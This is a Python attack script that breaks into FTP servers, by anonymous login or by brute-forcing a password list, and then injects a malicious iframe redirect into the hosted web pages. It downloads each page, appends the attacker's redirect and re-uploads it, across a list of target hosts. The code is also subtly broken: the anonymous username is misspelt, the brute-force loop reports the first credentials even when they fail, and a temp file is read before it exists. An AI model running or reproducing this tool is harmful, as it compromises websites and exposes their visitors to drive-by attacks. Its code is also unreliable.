#! /usr/bin/python3
# _*_ coding:utf-8 _*_

__author__ = 'Junliang.Zhong'

import ftplib
import time
import optparse

def anonLogin(hostname):
	try:
		ftp = ftplib.FTP(hostname)
		ftp.login('annonymous', 'junliang.zhong@ericsson.com')
		print('\n[*] ' + str(hostname) + ' FTP Anonymous Logon Sccceeded!')
		ftp.quit()
		return True
	except Exception as e:
		print(e)
		return False

def bruteLogin(hostname, passwdFile):
	pF = open(passwdFile, 'r')
	for line in pF.readlines():
		time.sleep(1)
		userName = line.split(':')[0]
		passWord = line.split(':')[1].strip('\n')
		print('[+] Trying: ' + userName + '/' + passWord )
		try:
			ftp = ftplib.FTP(hostname)
			ftp.login(userName, passWord)
			print('\n[*] ' + str(hostname) + 'FTP brute login Succedded: ' + userName + '/' + passWord)
			ftp.quit()
			return(userName, passWord)
		except Exception as e:
			print(e)
			return(userName, passWord)

def returnDefault(ftp):
	try:
		ftp.cwd('/ezhonju')
		dirList = ftp.nlst()
	except:
		dirList = []
		print('[-] Cound not list directory contents.')
		print('[-] Skinpping To Next Target.')
		return []
	retList = []
	for fileName in dirList:
		fn = fileName.lower()
		if '.php' in fn or '.htm' in fn or '.asp' in fn:
			print('[+] Found default page: ' + fileName)
			retList.append(fileName)
	return retList

def injectPage(ftp, page, redirect):
	f = open(page + '.tmp', 'r')
	if len(f.readlines()) == 0 :
		redirect = redirect + '\n'
	else:
		redirect = '\n' + redirect + '\n'
	f = open(page + '.tmp', 'w')
	ftp.retrlines('RETR ' + page, f.write)
	print('[+] Downloaded Page: ' + page)
	f.write(redirect)
	f.close()
	print('[+] injected Malicious IFrame on: ' + page)
	ftp.delete(page)
	fp = open(page + '.tmp', 'rb')
	ftp.storbinary('STOR ' + page, fp)
	# ftp.storlines('STOR ' + page, open(page + '.tmp'))
	print('[+] Uploaded Injected Page: ' + page)

def attack(username, password, tgtHost, redirect):
	ftp = ftplib.FTP(tgtHost)
	ftp.login(username, password)
	defPages = returnDefault(ftp)
	for defPage in defPages:
		injectPage(ftp, defPage, redirect)

def main():
	parser = optparse.OptionParser('Usage%prog ' + ' -H <target host[s]> -r <redirect page> [-f <userpass file>]')
	parser.add_option('-H', dest = 'tgtHost', type = 'string', help = 'specify target host')
	parser.add_option('-f', dest = 'passwdFile', type = 'string', help = 'specify user/password file')
	parser.add_option('-r', dest = 'redirect', type = 'string', help = 'specify a redirection page')
	(options, args) = parser.parse_args()
	tgtHosts = str(options.tgtHost).split(', ')
	passwdFile = options.passwdFile
	redirect = options.redirect

	if tgtHosts == None or redirect == None :
		print(parser.usage)
		exit(0)
	for tgtHost in tgtHosts:
		username = None
		password = None
		if anonLogin(tgtHost) == True:
			username = 'anonymous'
			password = 'junliang.zhong@ericsson.com'
			print('[+] Using Anonymous Creds to attack')
			attack(username, password, tgtHost, redirect)
		elif passwdFile != None:
			(username, password) = \
			bruteLogin(tgtHost, passwdFile)
		if password != None:
			print('[+] Using Creds: ' + username + '/' + password + ' to attack')
			attack(username, password, tgtHost, redirect)

if __name__ == '__main__':
	main()